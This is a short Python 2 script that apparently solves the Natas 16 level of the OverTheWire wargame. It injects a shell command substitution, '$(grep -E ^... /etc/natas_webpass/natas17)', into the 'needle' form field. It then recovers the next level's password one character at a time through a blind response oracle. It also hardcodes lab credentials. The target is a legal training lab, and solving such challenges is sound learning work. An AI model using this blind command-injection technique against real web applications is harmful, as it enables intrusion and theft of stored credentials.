import urllib2
import urllib
import string

print

top_level = "http://natas16.natas.labs.overthewire.org//"

# proxyhand = urllib2.ProxyHandler({'http':'127.0.0.1:8080'})

passmgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
passmgr.add_password(None, top_level, "natas16", "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh")
passhand = urllib2.HTTPBasicAuthHandler(passmgr)

# opener = urllib2.build_opener(proxyhand,passhand)
opener = urllib2.build_opener(passhand)

opener.addheaders = []
urllib2.install_opener(opener)

url = top_level + "index.php"

# p = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
p =  ""
# p =   "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

length = 32
for i in range(len(p)+1,length+1):
	for c in (string.digits + string.uppercase + string.lowercase):
		print c,
		params = {}
		params["needle"] = "$(grep -E ^" + p + c + " /etc/natas_webpass/natas17)hackers"
		req = urllib2.Request(url, data=urllib.urlencode(params))
		page = urllib2.urlopen(req).read()
		if (page.count("hackers") != 1):
			p += c
			print p
			break

print
print p
